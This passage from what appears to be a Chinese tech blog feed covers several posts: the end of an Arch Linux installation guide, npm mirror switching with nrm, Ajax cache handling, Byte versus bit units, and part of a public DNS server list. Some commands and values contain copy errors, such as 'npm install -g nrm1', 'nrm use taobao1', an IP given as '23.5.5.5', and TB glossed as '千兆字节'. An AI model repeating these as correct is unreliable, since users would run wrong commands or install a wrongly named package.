一个无线所需 一个编辑器 一个补全工具</span></span><br></pre></td></tr></table></figure><h2 id="生成-fstab-文件"><a href="#生成-fstab-文件" class="headerlink" title="生成 fstab 文件"></a>生成 fstab 文件</h2><p>fstab 用来定义磁盘分区</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">genfstab -U /mnt &gt;&gt; /mnt/etc/fstab</span><br></pre></td></tr></table></figure><p>复查一下 &#x2F;mnt&#x2F;etc&#x2F;fstab 确保没有错误</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /mnt/etc/fstab</span><br></pre></td></tr></table></figure><h2 id="Change-root"><a href="#Change-root" class="headerlink" title="Change root"></a>Change root</h2><p>把环境切换到 <code>新系统</code>的 <code>/mnt</code> 下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arch-chroot /mnt</span><br></pre></td></tr></table></figure><h2 id="时区设置"><a href="#时区设置" class="headerlink" title="时区设置"></a>时区设置</h2><p>设置时区，在 <code>/etc/localtime</code> 下用 <code>/usr</code> 中合适的时区创建符号连接<br>如下设置 <code>上海时区</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</span><br></pre></td></tr></table></figure><p>随后进行硬件时间设置，将当前的正确 UTC 时间写入硬件时间</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hwclock --systohc</span><br></pre></td></tr></table></figure><h2 id="设置-Locale-进行本地化"><a href="#设置-Locale-进行本地化" class="headerlink" title="设置 Locale 进行本地化"></a>设置 Locale 进行本地化</h2><p>Locale 决定了 <code>地域</code> 、 <code>货币</code> 、 <code>时区日期的格式</code> 、 <code>字符排列方式</code> 和其他本地化标准</p><p>首先使用 <code>vim</code> 编辑 <code>/etc/locale.gen</code> ，去掉 <code>en_US.UTF-8</code> 所在行以及 <code>zh_CN.UTF-8</code> 所在行的注释符号 <code>#</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/locale.gen</span><br></pre></td></tr></table></figure><p>然后使用如下命令生成 locale</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">locale-gen</span><br></pre></td></tr></table></figure><p>最后向 <code>/etc/locale.conf</code> 导入内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;LANG=en_US.UTF-8&#x27;</span>  &gt; /etc/locale.conf</span><br></pre></td></tr></table></figure><h2 id="设置主机名"><a href="#设置主机名" class="headerlink" title="设置主机名"></a>设置主机名</h2><p>首先在 <code>/etc/hostname</code> 设置主机名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hostname</span><br></pre></td></tr></table></figure><p>加入你想为主机取的主机名，这里比如叫 ArchZer0s<br>接下来在&#x2F;etc&#x2F;hosts设置与其匹配的条目</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure><p>加入如下内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1   localhost</span><br><span class="line">::1         localhost</span><br><span class="line">127.0.1.1   ArchZer0s</span><br></pre></td></tr></table></figure><p>某些情况下如不设置主机名<br>在 <code>KDE</code> 下可能会存在网络情况变更时 <code>无法启动 GUI 应用</code> 的问题<br>在终端中出现形如 <code>No protocol specified qt.qpa.xcb: could not connect to display</code> 的错误<br>这种情况较为少见 <a href="https://bbs.archlinux.org/viewtopic.php?id=241338">Ⅲ</a> <a href="https://bbs.archlinux.org/viewtopic.php?id=243674">Ⅳ</a> <a href="https://wiki.archlinux.org/title/Network_configuration#Local_hostname_resolution">Ⅴ</a></p><h2 id="为-root-用户设置密码"><a href="#为-root-用户设置密码" class="headerlink" title="为 root 用户设置密码"></a>为 root 用户设置密码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd</span><br></pre></td></tr></table></figure><h2 id="安装微码"><a href="#安装微码" class="headerlink" title="安装微码"></a>安装微码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pacman -S intel-ucode   <span class="comment">#Intel</span></span><br><span class="line">pacman -S amd-ucode     <span class="comment">#AMD</span></span><br></pre></td></tr></table></figure><h2 id="安装引导程序"><a href="#安装引导程序" class="headerlink" title="安装引导程序"></a>安装引导程序</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pacman -S grub efibootmgr   <span class="comment">#grub是启动引导器，efibootmgr被 grub 脚本用来将启动项写入 NVRAM。</span></span><br><span class="line">grub-install --target=x86_64-efi --efi-directory=/efi --bootloader-id=GRUB</span><br></pre></td></tr></table></figure><p>接下来编辑 <code>/etc/default/grub</code> 文件<br>去掉 <code>GRUB_CMDLINE_LINUX_DEFAULT</code> 一行中最后的 <code>quiet</code> 参数<br>同时把 <code>log level</code> 的数值从 <code>3</code> 改成 <code>5</code><br>这样是为了后续如果出现系统错误，方便排错<br>同时在同一行加入 <code>nowatchdog</code> 参数<br>这可以显著提高开关机速度</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/default/grub</span><br></pre></td></tr></table></figure><p>使用 N 卡的用户需要注意<br><code>KDE6</code> 默认使用 <code>wayland session</code> 为默认<br>如果你需要使用 <code>wayland</code> ,则需开启 <code>DRM</code><br>同样编辑 <code>/etc/default/grub</code> 文件<br>在 <code>GRUB_CMDLINE_LINUX_DEFAULT</code> 一行中最后的加入参数 <code>nvidia_drm.modeset=1</code></p><p>最后生成 GRUB 所需的配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grub-mkconfig -o /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure><blockquote><p>我们在之前的命令中指定了 <code>bootloader-id</code> 为 <code>GRUB</code><br>这一般不会出现问题<br>然而在某些主板安装完成后，你会发现 <code>没有 nvme 启动条目</code><br>这是因为 <code>某些主板</code> 的 <code>UEFI 固件</code> 在显示 <code>UEFI NVRAM</code> 引导条目 <code>之前</code><br>需要在特定的位置存放可引导文件，<code>不支持自定义</code> 存放 <code>efi 文件</code> <a href="https://wiki.archlinux.org/index.php/GRUB#Default/fallback_boot_path">Ⅵ</a><br>解决方式是使用 <code>--removable</code> 参数解决一些主板 <code>NVRAM</code> 的兼容性问题</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grub-install --target=x86_64-efi --efi-directory=/efi --removable</span><br><span class="line">grub-mkconfig -o /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure><p>除此之外，如果你的主板是一些较老的型号<br>如 <code>intel 9</code> 系列以下或者 <code>较老 AMD 的主板</code><br>它们很可能 <code>不支持</code> 从 nvme 启动系统<br>虽然可以通过 <code>修改 BIOS</code> 加入 NVME 支持模块来解决<br>但这不在本文讨论范围内</p><h2 id="完成安装"><a href="#完成安装" class="headerlink" title="完成安装"></a>完成安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exit</span>                <span class="comment"># 退回安装环境#</span></span><br><span class="line">umount -R  /mnt     <span class="comment"># 卸载新分区</span></span><br><span class="line">reboot              <span class="comment"># 重启</span></span><br></pre></td></tr></table></figure><p>注意，重启前要先拔掉优盘，否则你重启后还是进安装程序而不是安装好的系统<br>重启后，<code>开启 dhcp 服务</code> ，即可连接网络</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start dhcpcd  <span class="comment">#立即启动dhcp</span></span><br><span class="line">ping www.gnu.org      <span class="comment">#测试网络连接</span></span><br></pre></td></tr></table></figure><p>若为无线链接，则还需要启动 <code>iwd</code> 才可以使用 <code>iwctl</code> 连接网络</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start iwd <span class="comment">#立即启动iwd</span></span><br><span class="line">iwctl               <span class="comment">#和之前的方式一样，连接无线网络</span></span><br></pre></td></tr></table></figure><p>到此为止，一个基础的，<code>无 UI 界面</code> 的 <code>Arch Linux</code> 已经安装完成了</p><blockquote><p>ArchLinux 在 <code>2021 年 4 月</code> 在安装镜像中内置了一个安装脚本，提供一些选项，即可快速安装<br>其和所有一键安装脚本类似，提供自动化，且不灵活的安装过程<br><code>不建议</code> 使用这种安装脚本，除了不灵活的原因，<code>初学者也无法在这种安装过程中学到任何东西</code><br>如果你因为任何原因需要 <code>快速启动一个基础的 ArchLinux 环境</code> ，那么可以 <code>尝试</code> 此脚本</p></blockquote>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/%E6%9D%82%E8%B0%88/">杂谈</category>
      
      <category domain="https://zerospace.dev/tags/%E5%BC%80%E5%8F%91/">开发</category>
      
      <category domain="https://zerospace.dev/tags/%E7%BD%91%E7%BB%9C/">网络</category>
      
      <category domain="https://zerospace.dev/tags/Linux/">Linux</category>
      
      
      <comments>https://zerospace.dev/posts/f0c3d80/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>国内npm源镜像</title>
      <link>https://zerospace.dev/posts/6842c86a/</link>
      <guid>https://zerospace.dev/posts/6842c86a/</guid>
      <pubDate>Sat, 16 Nov 2024 11:00:00 GMT</pubDate>
      
        
        
      <description>&lt;blockquote&gt;
&lt;p&gt;国内npm源镜像（npm加速下载） 指定npm镜像&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;国内npm源镜像&quot;&gt;&lt;a href=&quot;#国内npm源镜像&quot; class=&quot;headerlink&quot; title=&quot;国内npm源镜像&quot;&gt;&lt;/a&gt;国内</description>
        
      
      
      
      <content:encoded><![CDATA[<blockquote><p>国内npm源镜像（npm加速下载） 指定npm镜像</p></blockquote><h2 id="国内npm源镜像"><a href="#国内npm源镜像" class="headerlink" title="国内npm源镜像"></a>国内npm源镜像</h2><h3 id="指定npm镜像"><a href="#指定npm镜像" class="headerlink" title="指定npm镜像"></a>指定npm镜像</h3><table><thead><tr><th align="center">NPM镜像提供方</th><th>NPM镜像地址</th></tr></thead><tbody><tr><td align="center">NPM官方</td><td><a href="https://registry.npmjs.org/">https://registry.npmjs.org/</a></td></tr><tr><td align="center">淘宝</td><td><a href="https://registry.npm.taobao.org/">https://registry.npm.taobao.org/</a></td></tr><tr><td align="center">阿里云</td><td><a href="https://npm.aliyun.com/">https://npm.aliyun.com/</a></td></tr><tr><td align="center">腾讯云</td><td><a href="https://mirrors.cloud.tencent.com/npm/">https://mirrors.cloud.tencent.com/npm/</a></td></tr><tr><td align="center">华为云</td><td><a href="https://mirrors.huaweicloud.com/repository/npm/">https://mirrors.huaweicloud.com/repository/npm/</a></td></tr><tr><td align="center">网易</td><td><a href="https://mirrors.163.com/npm/">https://mirrors.163.com/npm/</a></td></tr><tr><td align="center">中科院大学</td><td><a href="http://mirrors.ustc.edu.cn/">http://mirrors.ustc.edu.cn/</a></td></tr><tr><td align="center">清华大学</td><td><a href="https://mirrors.tuna.tsinghua.edu.cn/">https://mirrors.tuna.tsinghua.edu.cn/</a></td></tr></tbody></table><h3 id="切换源"><a href="#切换源" class="headerlink" title="切换源"></a>切换源</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry 源的地址</span><br></pre></td></tr></table></figure><h3 id="查看当前的镜像源"><a href="#查看当前的镜像源" class="headerlink" title="查看当前的镜像源"></a>查看当前的镜像源</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config get registry</span><br></pre></td></tr></table></figure><p>推荐使用上面的方式指定npm镜像，当然方法不唯一，也可以用 <code>nrm</code> 去指定npm镜像</p><h2 id="什么是nrm"><a href="#什么是nrm" class="headerlink" title="什么是nrm"></a>什么是<code>nrm</code></h2><p><code>nrm</code> 是一个 <code>npm 源管理器</code>，允许你快速地在 <code>npm</code> 源间切换</p><h2 id="安装nrm"><a href="#安装nrm" class="headerlink" title="安装nrm"></a>安装nrm</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g nrm1</span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="查看可选的源"><a href="#查看可选的源" class="headerlink" title="查看可选的源"></a>查看可选的源</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nrm <span class="built_in">ls</span>   </span><br><span class="line">1</span><br></pre></td></tr></table></figure><h3 id="切换"><a href="#切换" class="headerlink" title="切换"></a>切换</h3><p>如果要切换到taobao源，执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nrm use taobao1</span><br></pre></td></tr></table></figure><h2 id="测试速度"><a href="#测试速度" class="headerlink" title="测试速度"></a>测试速度</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nrm <span class="built_in">test</span></span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/%E5%BC%80%E5%8F%91/">开发</category>
      
      <category domain="https://zerospace.dev/tags/%E7%BD%91%E7%BB%9C/">网络</category>
      
      
      <comments>https://zerospace.dev/posts/6842c86a/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Ajax对缓存的处理</title>
      <link>https://zerospace.dev/posts/83b5945e/</link>
      <guid>https://zerospace.dev/posts/83b5945e/</guid>
      <pubDate>Fri, 15 Nov 2024 08:46:20 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;缓存&quot;&gt;&lt;a href=&quot;#缓存&quot; class=&quot;headerlink&quot; title=&quot;缓存&quot;&gt;&lt;/a&gt;缓存&lt;/h2&gt;&lt;p&gt;浏览器的一次请求需要从服务器获得许多css、img、js等相关的文件&lt;br&gt;如果每次请求都把相关资源文件加载一次&lt;br&gt;对带宽、服务器资源、</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><p>浏览器的一次请求需要从服务器获得许多css、img、js等相关的文件<br>如果每次请求都把相关资源文件加载一次<br>对带宽、服务器资源、用户等待时间都有严重的损耗<br>浏览器有做优化处理，就是把css、img、js等文件在第一次请求成功后就在本地保留一个缓存备份<br>后续的每次请辞u就在本身获得相关的缓存资源文件就可以了<br>可以明显地加快用户的访问速度</p><p>css、img、js等文件可以缓存<br>但是动态程序文件例如PHP文件不能进行缓存<br>即使缓存我们也不要其缓存效果。<br>览器对动态程序文件缓存的处理解决：</p><ol><li>给请求的地址设置随机数【推荐】</li><li>给动态程序设置header头信息，禁止浏览器对其缓存</li></ol><h2 id="给请求的地址设置随机数"><a href="#给请求的地址设置随机数" class="headerlink" title="给请求的地址设置随机数"></a>给请求的地址设置随机数</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>     </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span>     </span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Ajax对缓存的处理<span class="tag">&lt;/<span class="name">title</span>&gt;</span>     </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript">         </span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">f1</span>(<span class="params"></span>)&#123;        </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();      </span></span><br><span class="line"><span class="language-javascript">        xhr.<span class="title function_">open</span>(<span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;./server.php?&#x27;</span>+<span class="title class_">Math</span>.<span class="title function_">random</span>());             </span></span><br><span class="line"><span class="language-javascript">        xhr.<span class="title function_">send</span>(<span class="literal">null</span>);         </span></span><br><span class="line"><span class="language-javascript">    &#125;     </span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>     </span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Ajax对缓存的处理<span class="tag">&lt;/<span class="name">h2</span>&gt;</span>     </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;触发&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;f1()&quot;</span>&gt;</span>     </span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;result&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="给动态程序设置header头信息"><a href="#给动态程序设置header头信息" class="headerlink" title="给动态程序设置header头信息"></a>给动态程序设置header头信息</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置header头禁止浏览器缓存当前页面 </span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Cache-Control:no-cache&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Pragma:no-cache&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Expires:-1&quot;</span>); </span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;a&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;php &quot;</span>); <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/%E5%BC%80%E5%8F%91/">开发</category>
      
      <category domain="https://zerospace.dev/tags/%E7%BD%91%E7%BB%9C/">网络</category>
      
      <category domain="https://zerospace.dev/tags/%E5%89%8D%E7%AB%AF/">前端</category>
      
      <category domain="https://zerospace.dev/tags/JavaScript/">JavaScript</category>
      
      
      <comments>https://zerospace.dev/posts/83b5945e/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Byte，bit还傻傻分不清?</title>
      <link>https://zerospace.dev/posts/75a7f6/</link>
      <guid>https://zerospace.dev/posts/75a7f6/</guid>
      <pubDate>Wed, 13 Nov 2024 15:37:01 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;在数字化时代，我们经常听到关于计算机存储单位的术语，例如 Byte 、bit 、 Mbps 和 MB&amp;#x2F;s 等&lt;br&gt;这些单位在计算机科学和信息技术领域起着关键作用，但许多人可能对它们的确切含义和区别感到困惑&lt;br&gt;在本文中，我们将深入探讨 Byte 和 bit 的</description>
        
      
      
      
      <content:encoded><![CDATA[<p>在数字化时代，我们经常听到关于计算机存储单位的术语，例如 Byte 、bit 、 Mbps 和 MB&#x2F;s 等<br>这些单位在计算机科学和信息技术领域起着关键作用，但许多人可能对它们的确切含义和区别感到困惑<br>在本文中，我们将深入探讨 Byte 和 bit 的差异，并探讨与之相关的衍生单位，如 Mbps 和 MB&#x2F;s</p><h2 id="Byte-与-bit-的基本概念"><a href="#Byte-与-bit-的基本概念" class="headerlink" title="Byte 与 bit 的基本概念"></a>Byte 与 bit 的基本概念</h2><p>bit（比特）<br>bit 是计算机存储单位中的最小单元，它可以表示二进制中的 0 或 1<br>一个 bit 就是一个二进制数字</p><h2 id="Byte（字节）"><a href="#Byte（字节）" class="headerlink" title="Byte（字节）"></a>Byte（字节）</h2><p>Byte 是更大的存储单位，由 8 个 bit 组成<br>它通常用来表示一个字符，例如字母、数字或符号<br>计算机文件的大小通常以字节为单位表示，例如 1 KB（千字节）等于 1024 字节</p><h2 id="bit-和-Byte-之间的关系"><a href="#bit-和-Byte-之间的关系" class="headerlink" title="bit 和 Byte 之间的关系"></a>bit 和 Byte 之间的关系</h2><p>bit 和 Byte 之间的关系是非常直观的：<br><code>1 Byte = 8 bit</code><br>这是因为 Byte 由 8 个 bit 组成，每个 bit 都代表二进制中的一个位置</p><h2 id="衍伸单位：Mbps和MB-s"><a href="#衍伸单位：Mbps和MB-s" class="headerlink" title="衍伸单位：Mbps和MB&#x2F;s"></a>衍伸单位：Mbps和MB&#x2F;s</h2><h3 id="Mbps（兆比特每秒）"><a href="#Mbps（兆比特每秒）" class="headerlink" title="Mbps（兆比特每秒）"></a>Mbps（兆比特每秒）</h3><p>Mbps 表示兆比特每秒，是网络速度和数据传输速度的常见单位<br>兆比特是数据传输速度的衡量单位，而每秒则表示在一秒钟内传输的比特数</p><h3 id="MB-s（兆字节每秒）"><a href="#MB-s（兆字节每秒）" class="headerlink" title="MB&#x2F;s（兆字节每秒）"></a>MB&#x2F;s（兆字节每秒）</h3><p>MB&#x2F;s 表示兆字节每秒，通常用于测量存储设备（如硬盘、固态硬盘）的读写速度<br>与 Mbps 不同，MB&#x2F;s 考虑的是字节而不是比特<br>1 兆字节每秒等于 8 兆比特每秒，因为 1 字节等于 8 比特</p><h2 id="存储容量的表示"><a href="#存储容量的表示" class="headerlink" title="存储容量的表示"></a>存储容量的表示</h2><p>除了 Byte 、KB 、MB 、GB 等基本单位外，还有一些更大的存储容量单位：</p><p>TB（千兆字节）： 1 TB 等于 1024 GB，常用于描述大型存储设备的容量，如硬盘驱动器、云存储等</p><p>PB（拍字节）： 1 PB 等于 1024 TB，用于表示极大规模的数据存储，例如大型数据中心的存储容量</p><p>EB（艾字节）： 1 EB 等于 1024 PB，这是一个非常庞大的存储容量，通常用于描述全球互联网的总体存储需求</p><h2 id="数据传输速度的实际运用"><a href="#数据传输速度的实际运用" class="headerlink" title="数据传输速度的实际运用"></a>数据传输速度的实际运用</h2><p>在实际应用中，网络速度和存储设备的读写速度是关键考虑因素。例如：</p><ul><li><p>下载和上传速度： 互联网服务提供商通常以Mbps为单位提供下载和上传速度，这直接影响用户在互联网上浏览、下载文件等活动的体验</p></li><li><p>存储设备速度： 固态硬盘（SSD）通常比传统机械硬盘（HDD）具有更高的读写速度，以 MB&#x2F;s 为单位进行评估</p></li></ul>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/%E6%9D%82%E8%B0%88/">杂谈</category>
      
      <category domain="https://zerospace.dev/tags/%E7%BD%91%E7%BB%9C/">网络</category>
      
      
      <comments>https://zerospace.dev/posts/75a7f6/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>国内外DNS列表</title>
      <link>https://zerospace.dev/posts/5068ae4e/</link>
      <guid>https://zerospace.dev/posts/5068ae4e/</guid>
      <pubDate>Sat, 09 Nov 2024 09:26:24 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;国内外知名免费公共DoT&amp;#x2F;DoH加密DNS服务器(含IPV6)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;加密DNS&lt;/code&gt;传输过程中&lt;code&gt;第三方无法查看&lt;/code&gt;&lt;</description>
        
      
      
      
      <content:encoded><![CDATA[<p>国内外知名免费公共DoT&#x2F;DoH加密DNS服务器(含IPV6)</p><p><strong>注意</strong></p><blockquote><ol><li><p><code>加密DNS</code>传输过程中<code>第三方无法查看</code><br>无法污染DNS结果<code>不代表</code>DNS服务器本身不作恶</p></li><li><p>在国内使用国外加密DNS有可能无法上网<br>能使用<code>8.8.8.8</code>上网不代表 <code>DoH(https://8.8.8.8/dns-query)</code> 就可以访问<br>经测试大多数国外DoH在国内都<code>被屏蔽</code><br>能使用的解析速度也很慢</p></li></ol></blockquote><h2 id="阿里公共DNS"><a href="#阿里公共DNS" class="headerlink" title="阿里公共DNS"></a>阿里公共DNS</h2><p>IPv4:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">223.5.5.5</span><br><span class="line">223.6.6.6</span><br></pre></td></tr></table></figure><p>IPv6:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2400:3200::1</span><br><span class="line">2400:3200:baba::1</span><br></pre></td></tr></table></figure><p>DoH:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://223.5.5.5/dns-query</span><br><span class="line">https://223.6.6.6/dns-query</span><br><span class="line">https://dns.alidns.com/dns-query</span><br></pre></td></tr></table></figure><p>DoT:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dns.alidns.com</span><br><span class="line">23.5.5.5</span><br><span class="line">223.6.6.6</span><br></pre></td></tr></table></figure><h2 id="腾讯公共DNS-DNSPod"><a href="#腾讯公共DNS-DNSPod" class="headerlink" title="腾讯公共DNS(DNSPod)"></a>腾讯公共DNS(DNSPod)</h2><p>IPv4:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">119.29.29.29</span><br></pre></td></tr></table></figure><p>IPV6:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2402:4e00::</span><br></pre></td></tr></table></figure><p>DoH:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://doh.pub/dns-query</span><br><span class="line">https://1.12.12.12/dns-query</span><br><span class="line">https://120.53.53.53/dns-query</span><br><span class="line">https://sm2.doh.pub/dns-query  <span class="comment"># 国密</span></span><br></pre></td></tr></table></figure><p>DoT:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dot.pub</span><br><span class="line">1.12.12.12</span><br><span class="line">120.53.53.53</span><br></pre></td></tr></table></figure><h2 id="百度公共DNS"><a href="#百度公共DNS" class="headerlink" title="百度公共DNS"></a>百度公共DNS</h2><p>IPV4:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">180.76.76.76</span><br></pre></td></tr></table></figure><p>IPV6:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2400:da00::6666</span><br></pre></td></tr></table></figure><h2 id="360公共DNS"><a href="#360公共DNS" class="headerlink" title="360公共DNS"></a>360公共DNS</h2><p>电信&#x2F;铁通&#x2F;移动IPv4:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">101.226.4.6</span><br><span class="line">218.30.118.6</span><br></pre></td></tr></table></figure><p>联通IPv4:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 